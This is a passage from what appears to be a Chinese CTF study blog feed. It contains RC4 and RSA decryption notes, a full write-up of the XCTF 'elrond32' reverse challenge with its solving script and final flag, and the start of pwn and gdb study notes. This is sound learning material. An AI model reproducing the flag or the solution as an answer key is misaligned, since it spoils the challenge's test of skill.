class="number">0x33</span>,<span class="number">0x53</span>,<span class="number">0x31</span>,<span class="number">0x0</span>,<span class="number">0x40</span>,<span class="number">0xd6</span>,<span class="number">0xca</span>,<span class="number">0xec</span>,<span class="number">0xd4</span> ]</span><br><span class="line"><span class="comment"># 不能有空格, 为汇编中的原数据  </span></span><br><span class="line"><span class="comment"># mov     [rbp+var_50], 0C6h  中的0xC6</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;Nu1Lctf233&quot;</span></span><br><span class="line">s = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    s += <span class="built_in">chr</span>(i)</span><br><span class="line">    </span><br><span class="line">s = <span class="built_in">str</span>(base64.b64encode(s.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(s)</span><br><span class="line"></span><br><span class="line">rc4_main(key, s)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="RSA-C，N，E"><a href="#RSA-C，N，E" class="headerlink" title="RSA (C，N，E)"></a>RSA (C，N，E)</h4><p>可能会出现  <code>__gmpz_powm(v6, v6, v5, v4);</code> 这类伪代码，<strong>v6 的 v5方模 v4赋值给 v6</strong><br>并且有明显特征的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__gmpz_init_set_str(v7, &quot;ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35&quot;, 16LL);    (需改写成0xad93...)</span><br><span class="line">__gmpz_init_set_str(v4, &quot;103461035900816914121390101299049044413950405173712170434161686539878160984549&quot;, 10LL);</span><br><span class="line">__gmpz_init_set_str(v5, &quot;65537&quot;, 10LL);</span><br><span class="line">__gmpz_powm(v6, v6, v5, v4);</span><br></pre></td></tr></table></figure><p>v4就是 N ，分解出 p &#x2F; q :  <a href="http://www.factordb.com/">http://www.factordb.com/</a><br>稍短的 v5就是 E</p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">  </span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = gmpy2.powmod(c, d, n)</span><br><span class="line"><span class="comment"># print(binascii.unhexlify(hex(m)[2:]).decode(encoding=&quot;utf-8&quot;))</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(m)[<span class="number">2</span>:])  <span class="comment"># 需要HEX to String</span></span><br></pre></td></tr></table></figure><h4 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h4><ul><li>LL 结尾为长整型(Long Long)，小端存储，IDA 按 R 转换为 Char 类型需要进行逆序</li><li>Main 函数有 if () 判断条件后直接跟输出 flag 函数的，可以尝试动调绕过 if 直接输出关键函数，具体在于比较改为</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> CheckList </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF_Reverse_elrond32</title>
      <link href="/2025/03/27/XCTF-Reverse-elrond32/"/>
      <url>/2025/03/27/XCTF-Reverse-elrond32/</url>
      
        <content type="html"><![CDATA[<p><strong>XCTF Reverse板块中的elrond32题目，个人解法</strong><br>ExeinfoPE查看文件信息，32bit，那就用32位的IDA分析<br><img src="img.png" style="float: left;"></p><p>进入Main函数:<br><img src="img1.png" style="float: left;"></p><p>猜测  <strong>if ( a1 &gt; 1 &amp;&amp; sub_8048414(a2[1], 0))</strong>  条件满足，即输出flag函数  <strong>sub_8048538(a2[1])</strong>;<br>sub_8048538():<br><img src="img2.png" style="float: left;"></p><p>分析可得输出flag部分代码为(C):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i ) &#123;</span><br><span class="line">    flag[i] = v2[i] ^ a2[i % <span class="number">8</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unk_8048760 (v2):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.rodata:08048760 unk_8048760     db  0Fh                 ; DATA XREF: sub_8048538+12↑o</span><br><span class="line">.rodata:08048761                 db    0</span><br><span class="line">.rodata:08048762                 db    0</span><br><span class="line">.rodata:08048763                 db    0</span><br><span class="line">.rodata:08048764                 db  1Fh</span><br><span class="line">.rodata:08048765                 db    0</span><br><span class="line">.rodata:08048766                 db    0</span><br><span class="line">.rodata:08048767                 db    0</span><br><span class="line">.rodata:08048768                 db    4</span><br><span class="line">.rodata:08048769                 db    0</span><br><span class="line">.rodata:0804876A                 db    0</span><br><span class="line">.rodata:0804876B                 db    0</span><br><span class="line">.rodata:0804876C                 db    9</span><br><span class="line">.rodata:0804876D                 db    0</span><br><span class="line">.rodata:0804876E                 db    0</span><br><span class="line">.rodata:0804876F                 db    0</span><br><span class="line">.rodata:08048770                 db  1Ch</span><br><span class="line">.rodata:08048771                 db    0</span><br><span class="line">.rodata:08048772                 db    0</span><br><span class="line">.rodata:08048773                 db    0</span><br><span class="line">.rodata:08048774                 db  12h</span><br><span class="line">.rodata:08048775                 db    0</span><br><span class="line">.rodata:08048776                 db    0</span><br><span class="line">.rodata:08048777                 db    0</span><br><span class="line">.rodata:08048778                 db  42h ; B</span><br><span class="line">.rodata:08048779                 db    0</span><br><span class="line">.rodata:0804877A                 db    0</span><br><span class="line">.rodata:0804877B                 db    0</span><br><span class="line">.rodata:0804877C                 db    9</span><br><span class="line">.rodata:0804877D                 db    0</span><br><span class="line">.rodata:0804877E                 db    0</span><br><span class="line">.rodata:0804877F                 db    0</span><br><span class="line">.rodata:08048780                 db  0Ch</span><br><span class="line">.rodata:08048781                 db    0</span><br><span class="line">.rodata:08048782                 db    0</span><br><span class="line">.rodata:08048783                 db    0</span><br><span class="line">.rodata:08048784                 db  44h ; D</span><br><span class="line">.rodata:08048785                 db    0</span><br><span class="line">.rodata:08048786                 db    0</span><br><span class="line">.rodata:08048787                 db    0</span><br><span class="line">.rodata:08048788                 db  0Dh</span><br><span class="line">.rodata:08048789                 db    0</span><br><span class="line">.rodata:0804878A                 db    0</span><br><span class="line">.rodata:0804878B                 db    0</span><br><span class="line">.rodata:0804878C                 db    7</span><br><span class="line">.rodata:0804878D                 db    0</span><br><span class="line">.rodata:0804878E                 db    0</span><br><span class="line">.rodata:0804878F                 db    0</span><br><span class="line">.rodata:08048790                 db    9</span><br><span class="line">.rodata:08048791                 db    0</span><br><span class="line">.rodata:08048792                 db    0</span><br><span class="line">.rodata:08048793                 db    0</span><br><span class="line">.rodata:08048794                 db    6</span><br><span class="line">.rodata:08048795                 db    0</span><br><span class="line">.rodata:08048796                 db    0</span><br><span class="line">.rodata:08048797                 db    0</span><br><span class="line">.rodata:08048798                 db  2Dh ; -</span><br><span class="line">.rodata:08048799                 db    0</span><br><span class="line">.rodata:0804879A                 db    0</span><br><span class="line">.rodata:0804879B                 db    0</span><br><span class="line">.rodata:0804879C                 db  37h ; 7</span><br><span class="line">.rodata:0804879D                 db    0</span><br><span class="line">.rodata:0804879E                 db    0</span><br><span class="line">.rodata:0804879F                 db    0</span><br><span class="line">.rodata:080487A0                 db  59h ; Y</span><br><span class="line">.rodata:080487A1                 db    0</span><br><span class="line">.rodata:080487A2                 db    0</span><br><span class="line">.rodata:080487A3                 db    0</span><br><span class="line">.rodata:080487A4                 db  1Eh</span><br><span class="line">.rodata:080487A5                 db    0</span><br><span class="line">.rodata:080487A6                 db    0</span><br><span class="line">.rodata:080487A7                 db    0</span><br><span class="line">.rodata:080487A8                 db    0</span><br><span class="line">.rodata:080487A9                 db    0</span><br><span class="line">.rodata:080487AA                 db    0</span><br><span class="line">.rodata:080487AB                 db    0</span><br><span class="line">.rodata:080487AC                 db  59h ; Y</span><br><span class="line">.rodata:080487AD                 db    0</span><br><span class="line">.rodata:080487AE                 db    0</span><br><span class="line">.rodata:080487AF                 db    0</span><br><span class="line">.rodata:080487B0                 db  0Fh</span><br><span class="line">.rodata:080487B1                 db    0</span><br><span class="line">.rodata:080487B2                 db    0</span><br><span class="line">.rodata:080487B3                 db    0</span><br><span class="line">.rodata:080487B4                 db    8</span><br><span class="line">.rodata:080487B5                 db    0</span><br><span class="line">.rodata:080487B6                 db    0</span><br><span class="line">.rodata:080487B7                 db    0</span><br><span class="line">.rodata:080487B8                 db  1Ch</span><br><span class="line">.rodata:080487B9                 db    0</span><br><span class="line">.rodata:080487BA                 db    0</span><br><span class="line">.rodata:080487BB                 db    0</span><br><span class="line">.rodata:080487BC                 db  23h ; #</span><br><span class="line">.rodata:080487BD                 db    0</span><br><span class="line">.rodata:080487BE                 db    0</span><br><span class="line">.rodata:080487BF                 db    0</span><br><span class="line">.rodata:080487C0                 db  36h ; 6</span><br><span class="line">.rodata:080487C1                 db    0</span><br><span class="line">.rodata:080487C2                 db    0</span><br><span class="line">.rodata:080487C3                 db    0</span><br><span class="line">.rodata:080487C4                 db    7</span><br><span class="line">.rodata:080487C5                 db    0</span><br><span class="line">.rodata:080487C6                 db    0</span><br><span class="line">.rodata:080487C7                 db    0</span><br><span class="line">.rodata:080487C8                 db  55h ; U</span><br><span class="line">.rodata:080487C9                 db    0</span><br><span class="line">.rodata:080487CA                 db    0</span><br><span class="line">.rodata:080487CB                 db    0</span><br><span class="line">.rodata:080487CC                 db    2</span><br><span class="line">.rodata:080487CD                 db    0</span><br><span class="line">.rodata:080487CE                 db    0</span><br><span class="line">.rodata:080487CF                 db    0</span><br><span class="line">.rodata:080487D0                 db  0Ch</span><br><span class="line">.rodata:080487D1                 db    0</span><br><span class="line">.rodata:080487D2                 db    0</span><br><span class="line">.rodata:080487D3                 db    0</span><br><span class="line">.rodata:080487D4                 db    8</span><br><span class="line">.rodata:080487D5                 db    0</span><br><span class="line">.rodata:080487D6                 db    0</span><br><span class="line">.rodata:080487D7                 db    0</span><br><span class="line">.rodata:080487D8                 db  41h ; A</span><br><span class="line">.rodata:080487D9                 db    0</span><br><span class="line">.rodata:080487DA                 db    0</span><br><span class="line">.rodata:080487DB                 db    0</span><br><span class="line">.rodata:080487DC                 db  0Ah</span><br><span class="line">.rodata:080487DD                 db    0</span><br><span class="line">.rodata:080487DE                 db    0</span><br><span class="line">.rodata:080487DF                 db    0</span><br><span class="line">.rodata:080487E0                 db  14h</span><br><span class="line">.rodata:080487E1                 db    0</span><br><span class="line">.rodata:080487E2                 db    0</span><br></pre></td></tr></table></figure><br>这里选中数据后Shift + E 发现有很多的0x00 <br><img src="img3.png" style="float: left;"><br>使用LazyIDA提取数据，转换为DWORD (Double Word, 双字节, 占四BYTE，就可以把我们要的数据后边的0x00去除，避免出现一些问题)(选取数据，右键，Convert，Convert to C/C++ array (DWORD) )<img src="img4.png" style="float: left;"> <br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">unsigned int unk_8048760[33] = &#123;</span><br><span class="line">    0x0000000F, 0x0000001F, 0x00000004, 0x00000009, 0x0000001C, 0x00000012, 0x00000042, 0x00000009, </span><br><span class="line">    0x0000000C, 0x00000044, 0x0000000D, 0x00000007, 0x00000009, 0x00000006, 0x0000002D, 0x00000037, </span><br><span class="line">    0x00000059, 0x0000001E, 0x00000000, 0x00000059, 0x0000000F, 0x00000008, 0x0000001C, 0x00000023, </span><br><span class="line">    0x00000036, 0x00000007, 0x00000055, 0x00000002, 0x0000000C, 0x00000008, 0x00000041, 0x0000000A, </span><br><span class="line">    0x00000014</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>回到Main函数继续分析<strong>sub_8048414(a2[1], 0)</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_8048414</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">105</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">101</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">110</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">100</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">97</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">103</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">115</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_19;</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="number">114</span> )</span><br><span class="line">LABEL_19:</span><br><span class="line">        result = sub_8048414(a1 + <span class="number">1</span>, <span class="number">7</span> * (a2 + <span class="number">1</span>) % <span class="number">11</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到是一个很长的控制流，  **_BYTE <em>a1, int a2</em>*  就是带入的 a2[1], 0<br>当 a2 &#x3D; 0 时，进入 case0，a1被赋值为105，进入LABEL_19，调用了sub_8048414 我们所在的函数，所以判断这就是一个递归<br>每次完成赋值goto到 LABEL_19 会对a2重新运算  <strong>7 * (a2 + 1) % 11</strong> ，写一个脚本跑一下 (当然也可以手算)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a1[] = &#123;<span class="number">105</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">114</span>&#125;;</span><br><span class="line">    <span class="type">int</span> a2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, a1[a2]);</span><br><span class="line">        a2 = <span class="number">7</span> * (a2 + <span class="number">1</span>) % <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 105,115,101,110,103,97,114,100,</span></span><br></pre></td></tr></table></figure><p><strong>编写解密脚本(C)：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> a2[] = &#123;<span class="number">105</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">100</span>&#125;; </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v2[<span class="number">33</span>] = &#123;</span><br><span class="line">        <span class="number">0x0000000F</span>, <span class="number">0x0000001F</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000012</span>, <span class="number">0x00000042</span>, <span class="number">0x00000009</span>, </span><br><span class="line">        <span class="number">0x0000000C</span>, <span class="number">0x00000044</span>, <span class="number">0x0000000D</span>, <span class="number">0x00000007</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x0000002D</span>, <span class="number">0x00000037</span>, </span><br><span class="line">        <span class="number">0x00000059</span>, <span class="number">0x0000001E</span>, <span class="number">0x00000000</span>, <span class="number">0x00000059</span>, <span class="number">0x0000000F</span>, <span class="number">0x00000008</span>, <span class="number">0x0000001C</span>, <span class="number">0x00000023</span>, </span><br><span class="line">        <span class="number">0x00000036</span>, <span class="number">0x00000007</span>, <span class="number">0x00000055</span>, <span class="number">0x00000002</span>, <span class="number">0x0000000C</span>, <span class="number">0x00000008</span>, <span class="number">0x00000041</span>, <span class="number">0x0000000A</span>, </span><br><span class="line">        <span class="number">0x00000014</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; ++i ) &#123;</span><br><span class="line">        flag[i] = v2[i] ^ a2[i % <span class="number">8</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// flag&#123;s0me7hing_S0me7hinG_t0lki3n&#125;</span></span><br></pre></td></tr></table></figure><p>写的不好，有不对的地方请指出，谢谢 &gt;&lt;</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn_study_note</title>
      <link href="/2025/03/25/pwn-study-note/"/>
      <url>/2025/03/25/pwn-study-note/</url>
      
        <content type="html"><![CDATA[<h4 id="GDB-动调基础"><a href="#GDB-动调基础" class="headerlink" title="GDB 动调基础"></a>GDB 动调基础</h4><ul><li><code>RIP</code>: 存放当前执行的指令地址</li><li><code>RSP</code> : 栈顶指针</li><li><code>RBP</code>: 栈底指针</li><li><code>RAX</code>: 通用寄存器</li><li><code>zf</code>: Zero Flag 寄存器<br>INTEL 指令集</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure><h4 id="Assembly-一般指令"><a href="#Assembly-一般指令" class="headerlink" title="Assembly 一般指令"></a>Assembly 一般指令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sub rsp, 0x18  ;rsp = [rsp-0x18]</span><br><span class="line">mov rax, rbp   ;rax = rbp</span><br><span class="line">lea rax, [rbp-0x18]   ;与上面的操作相同, lea可以当作运算指令, 运算结束后赋值给rax  (优点：指令断，不用重新赋值rbp)</span><br><span class="line">xor ebx, ebx   ;ebx = 0 / mov ebx, 0</span><br><span class="line">call xxxx    ;调用一个子程序</span><br><span class="line"></span><br><span class="line">cmp al, 0x61   ;一般下面会跟je/jne，cmp就相当于sub指令，al-0x61，但是结果不保存，与下面的jne/je进行比较</span><br><span class="line">(ax,bx = 3, cmp ax,bx) 3-3=0 ，zf寄存器为1；相反的如果cmp两个数相减不等于0，那zf就等于0</span><br><span class="line">jne xxxxx   ;zf标志位不为0则跳转</span><br><span class="line">jn xxxx   ;zf标志位为0时跳转</span><br><span class="line">test eax, eax    ;当作cmp eax,0使用    eax&amp;eax, 相与, 相等相当于and eax,eax 但是不存储</span><br></pre></td></tr></table></figure><h4 id="gdb-一般操作"><a href="#gdb-一般操作" class="headerlink" title="gdb 一般操作"></a>gdb 一般操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run  直接运行程序 / start  开始调试程序 gdb会自动断到分析处的main函数处 (rip指向main)</span><br><span class="line">disassembly $rip  在rip处反汇编</span><br><span class="line">b  设置断点 , b *0x00005555555527a</span><br><span class="line">d num  删除断点</span><br><span class="line">disable b num  使断点失效</span><br><span class="line">enable b num  重新启用断点</span><br><span class="line">i b  查看设置的断点</span><br><span class="line">i r  查看所有寄存器</span><br><span class="line">c  continue 执行到断点</span><br><span class="line">ni   单步执行(步过)</span><br><span class="line">si   单步步入</span><br><span class="line">finish   步出</span><br><span class="line">p $rbp    print</span><br><span class="line">x/10i $rip   以汇编的方式查看$rip内存地址开始的下10行</span><br><span class="line">x/20b $rbp-0x10     ;b=byte</span><br><span class="line">x/20gx $rbp</span><br><span class="line">set *0x7fffffffd7c0=0x61    设置内存数据</span><br><span class="line">set *((unsigned int)$ebp)=0x61</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="pwntools库-一般操作"><a href="#pwntools库-一般操作" class="headerlink" title="pwntools库 一般操作"></a>pwntools库 一般操作</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 